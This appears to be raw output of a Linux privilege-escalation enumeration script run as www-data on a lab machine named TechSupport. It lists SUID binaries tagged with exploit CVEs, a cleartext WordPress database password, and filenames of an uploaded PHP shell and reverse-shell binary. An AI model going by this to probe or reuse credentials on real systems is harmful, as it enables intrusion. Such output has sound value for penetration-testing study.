:1.1                                 856 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
:1.198                              8839 busctl          www-data         :1.198        apache2.service           -          -                  
:1.2                                 869 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
:1.3                                 902 polkitd         root             :1.3          polkitd.service           -          -                  
:1.4                                1128 unattended-upgr root             :1.4          unattended-upgrades.se... -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.Accounts             869 accounts-daemon root             :1.2          accounts-daemon.service   -          -                  
 -- UID=0 EUID=0 
org.freedesktop.DBus                 813 dbus-daemon     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.PolicyKit1           902 polkitd         root             :1.3          polkitd.service           -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               856 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
org.freedesktop.network1               - -               -                (activatable) -                         -         
org.freedesktop.resolve1               - -               -                (activatable) -                         -         
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
TechSupport
127.0.0.1	localhost
127.0.1.1	TechSupport

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:6d:b9:d8:2b:73  
          inet addr:10.10.49.188  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::6d:b9ff:fed8:2b73/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:99179 errors:0 dropped:0 overruns:0 frame:0
          TX packets:97268 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:16050534 (16.0 MB)  TX bytes:34855962 (34.8 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:845 errors:0 dropped:0 overruns:0 frame:0
          TX packets:845 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:75552 (75.5 KB)  TX bytes:75552 (75.5 KB)

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    0      0        0 eth0
10.10.0.0       *               255.255.0.0     U     0      0        0 eth0

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 10.10.49.188:445        10.10.241.82:43642      ESTABLISHED -               
tcp6       0      0 :::445                  :::*                    LISTEN      -               
tcp6       0      0 :::139                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 10.10.49.188:80         10.10.241.82:38354      TIME_WAIT   -               
tcp6       0      0 10.10.49.188:80         10.10.241.82:40300      ESTABLISHED -               
tcp6       0      0 10.10.49.188:80         10.10.241.82:53534      TIME_WAIT   -               
tcp6       0      0 10.10.49.188:80         10.10.241.82:37792      TIME_WAIT   -               
tcp6       1      0 10.10.49.188:80         10.10.241.82:49902      CLOSE_WAIT  -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               

[+] Can I sniff with tcpdump?
No


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Do I have PGP keys?
gpg Not Found

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
root:x:0:0:root:/root:/bin/bash
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=119(mysql) groups=119(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 19:40:40 up  3:22,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[+] Last logons
reboot   system boot  4.4.0-186-generi Sat May 29 00:09 - 00:10  (00:01)
root     pts/0        10.0.2.26        Fri May 28 23:51 - crash  (00:17)
reboot   system boot  4.4.0-186-generi Fri May 28 23:50 - 00:10  (00:19)
root     pts/0        10.0.2.26        Fri May 28 23:36 - 23:49  (00:12)
root     tty1                          Fri May 28 23:35 - down   (00:14)
reboot   system boot  4.4.0-186-generi Fri May 28 23:35 - 23:49  (00:14)
scamsite tty1                          Fri May 28 23:30 - down   (00:04)
reboot   system boot  4.4.0-186-generi Fri May 28 23:29 - 23:34  (00:05)

wtmp begins Fri May 28 23:29:12 2021

[+] Last time logon each user
Username         Port     From             Latest
root             tty1                      Sun Nov 21 11:17:57 +0530 2021
scamsite         tty1                      Fri May 28 23:30:20 +0530 2021

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version
mysql  Ver 15.1 Distrib 10.0.38-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
Version: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2020-08-12T21:35:50
PHP exec extensions
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source

[+] Searching PHPCookies
 Not Found

[+] Searching Wordpress wp-config.php files
wp-config.php files found:
/var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
define( 'DB_HOST', 'localhost' );

[+] Searching Drupal settings.php files
/default/settings.php Not Found

[+] Searching Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
 Not Found

[+] Searching supervisord configuration file
supervisord.conf Not Found

[+] Searching cesi configuration file
cesi.conf Not Found

[+] Searching Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
  --> Some certificates were found (out limited):
/var/www/html/subrion/includes/hybrid/thirdparty/Facebook/HttpClients/certs/DigiCertHighAssuranceEVRootCA.pem
/etc/apache2/sites-enabled

 --> /etc/hosts.allow file found, read the rules:



Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
-rw------- 1 root root 430080 May 28  2021 /var/lib/samba/private/secrets.tdb

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /var/run/screen/S-www-data.

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/bin/umount		--->	BSD/Linux(08-1996)
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/ping
/usr/bin/newuidmap
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/bin/chsh
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/sudo		--->	/sudo$
/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/sbin/mount.cifs

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/crontab
/usr/bin/wall
/usr/bin/chage
/usr/bin/mlocate
/usr/bin/bsd-write
/usr/bin/screen		--->	GNU_Screen_4.5.0
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/lib/x86_64-linux-gnu/utempter/utempter
/sbin/pam_extrausers_chkpwd
/sbin/unix_chkpwd

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/local/lib
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

[+] Users with capabilities
/etc/security/capability.conf Not Found

[+] Files with ACLs
files with acls in searched folders Not Found

[+] .sh files in path
/usr/bin/gettext.sh

[+] Unexpected folders in root

[+] Files (scripts) in /etc/profile.d/
total 24
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21  2021 ..
-rw-r--r--  1 root root 1557 Apr 15  2016 Z97-byobu.sh
-rw-r--r--  1 root root  825 Jul 11  2020 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 20)
/home
/home/scamsite/websvr
/home/scamsite/websvr/enter.txt

[+] Searching others files in folders owned by me

[+] Readable files belonging to root and readable by me but not world readable

[+] Modified interesting files in the last 5mins (limit 100)
/var/www/html/subrion/uploads/lin.out
/var/log/auth.log
/var/log/syslog
/var/log/kern.log

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
Writable: /var/www/html/subrion/includes/classes/ia.core.log.php
#)You_can_write_more_log_files_inside_last_directory

[+] Files inside /home/www-data (limit 20)

[+] Files inside others home (limit 20)
/home/scamsite/.bash_logout
/home/scamsite/.bashrc
/home/scamsite/.bash_history
/home/scamsite/.profile
/home/scamsite/websvr/enter.txt
/home/scamsite/.sudo_as_admin_successful

[+] Searching installed mail applications

[+] Mails (limit 50)

[+] Backup files?
-rwxr-xr-x 1 www-data www-data 6663 Jun 14  2018 /var/www/html/subrion/install/classes/ia.backup.php
-rwxr-xr-x 1 www-data www-data 3144 Jun 14  2018 /var/www/html/subrion/install/templates/upgrade.backup.tpl
-rw-r--r-- 1 root root 128 May 28  2021 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 1332 Jul 15  2020 /etc/apache2/sites-available/000-default.conf.bak
-rw-r--r-- 1 root root 673 May 28  2021 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 May 28  2021 /etc/xml/catalog.old
-rwxr-xr-x 1 root root 10504 Mar 14  2016 /usr/bin/tdbbackup.tdbtools

[+] Searching tables inside readable .db/.sqlite files (limit 100)

[+] Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K May 28  2021 .
drwxr-xr-x 14 root root 4.0K May 28  2021 ..
drwxr-xr-x  5 root root 4.0K May 29  2021 html

/var/www/html:
total 36K
drwxr-xr-x  5 root     root     4.0K May 29  2021 .
drwxr-xr-x  3 root     root     4.0K May 28  2021 ..

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2188 Sep  1  2015 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Sep  1  2015 /etc/skel/.bashrc
-rw-r--r-- 1 root root 655 Jul 13  2019 /etc/skel/.profile
lrwxrwxrwx 1 root root 43 May 28  2021 /etc/systemd/system/timers.target.wants/snapd.snap-repair.timer -> /lib/systemd/system/snapd.snap-repair.timer
-rw-r--r-- 1 scamsite scamsite 3771 May 28  2021 /home/scamsite/.bashrc
-rw-r--r-- 1 scamsite scamsite 655 May 28  2021 /home/scamsite/.profile
-rw-r--r-- 1 scamsite scamsite 0 May 28  2021 /home/scamsite/.sudo_as_admin_successful
-rwxr-xr-x 1 root root 484 Dec  9  2016 /usr/lib/initramfs-tools/etc/dhcp/dhclient-enter-hooks.d/config
-rw-r--r-- 1 root root 3106 Oct  2  2019 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 3161 Apr 15  2016 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 870 Jul  3  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 1865 Jul  3  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Aug 12 16:18 /run/network/.ifstate.lock
-rw------- 1 root root 0 Aug 10  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 1391 May 28  2021 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Sep  1  2015 /etc/skel/.bash_logout
-rw-r--r-- 1 scamsite scamsite 220 May 28  2021 /home/scamsite/.bash_logout
-rwxr-xr-x 1 www-data www-data 629 May  9  2016 /var/www/html/wordpress/wp-content/plugins/akismet/.htaccess
-rwxr-xr-x 1 www-data www-data 89 Nov 13  2020 /var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintignore
-rwxr-xr-x 1 www-data www-data 688 Feb 19  2021 /var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintrc-css.json
-rwxr-xr-x 1 www-data www-data 356 Nov 13  2020 /var/www/html/wordpress/wp-content/themes/twentytwentyone/.stylelintrc.json
-rwxr-xr-x 1 www-data www-data 269 Oct 26  2019 /var/www/html/wordpress/wp-content/themes/twentytwenty/.stylelintrc.json
-rw-r--r-- 1 www-data www-data 543 May 29  2021 /var/www/html/wordpress/.htaccess
-rwxr-xr-x 1 www-data www-data 656 Jun 14  2018 /var/www/html/subrion/uploads/.htaccess
-rwxr-xr-x 1 www-data www-data 31 Jun 14  2018 /var/www/html/subrion/includes/elfinder/php/.tmp/.htaccess
-rwxr-xr-x 1 www-data www-data 13 Jun 14  2018 /var/www/html/subrion/updates/.htaccess
-rwxr-xr-x 1 www-data www-data 14 Jun 14  2018 /var/www/html/subrion/tmp/.htaccess
-rwxr-xr-x 1 www-data www-data 274 Jun 14  2018 /var/www/html/subrion/install/.htaccess
-rwxr-xr-x 1 www-data www-data 28 Jun 14  2018 /var/www/html/subrion/admin/templates/emails/.babelrc
-rwxr-xr-x 1 www-data www-data 13 Jun 14  2018 /var/www/html/subrion/templates/kickstart/less/.htaccess
-rwxr-xr-x 1 www-data www-data 2318 Jun 14  2018 /var/www/html/subrion/.htaccess
-rwxr-xr-x 1 www-data www-data 14 Jun 14  2018 /var/www/html/subrion/backup/.htaccess
-rw-r--r-- 1 root root 1319 May 28  2021 /var/lib/apparmor/profiles/.apparmor.md5sums
-rw-r--r-- 1 root root 22 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/.15401.d
-rw-r--r-- 1 root root 820 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 2839 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 3239 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 3253 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 1193 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/basic/.bin2c.cmd
-rw-r--r-- 1 root root 4268 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 3755 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/kconfig/.conf.o.cmd
-rw-r--r-- 1 root root 110 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/kconfig/.conf.cmd
-rw-r--r-- 1 root root 4917 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r-- 1 root root 2380 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 2391 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 5133 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 2719 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 3347 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 153 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 2481 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 3568 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 3387 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 3972 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 4495 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 2537 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 129 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 104 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 5345 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 3485 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.file2alias.o.cmd
-rw-r--r-- 1 root root 4622 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 2443 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 4451 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 190974 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/.config
-rw-r--r-- 1 root root 12524 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 3362 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/tools/.relocs_32.o.cmd
-rw-r--r-- 1 root root 146 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/tools/.relocs.cmd
-rw-r--r-- 1 root root 3342 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/tools/.relocs_common.o.cmd
-rw-r--r-- 1 root root 3362 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/tools/.relocs_64.o.cmd
-rw-r--r-- 1 root root 292 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
-rw-r--r-- 1 root root 320 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
-rw-r--r-- 1 root root 292 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
-rw-r--r-- 1 root root 402 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
-rw-r--r-- 1 root root 316 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
-rw-r--r-- 1 root root 320 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
-rw-r--r-- 1 root root 315 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
-rw-r--r-- 1 root root 340 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
-rw-r--r-- 1 root root 53221 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/kernel/.asm-offsets.s.cmd
-rw-r--r-- 1 root root 6208 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/purgatory/.sha256.o.cmd
-rw-r--r-- 1 root root 3607 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/purgatory/.string.o.cmd
-rw-r--r-- 1 root root 1379 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
-rw-r--r-- 1 root root 3621 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/purgatory/.purgatory.o.cmd
-rw-r--r-- 1 root root 1309 Jul  1  2020 /usr/src/linux-headers-4.4.0-186-generic/arch/x86/purgatory/.stack.o.cmd

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rwxrwxrwx 1 www-data www-data 5494 Aug 12 18:40 /tmp/shell.php
-rwxrwxrwx 1 www-data www-data 250 Aug 12 17:56 /tmp/reverse.elf
-rw-r--r-- 1 root root 8967 May 29  2021 /var/backups/apt.extended_states.0

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/run/screen/S-www-data
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/reverse.elf
/tmp/shell.php
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
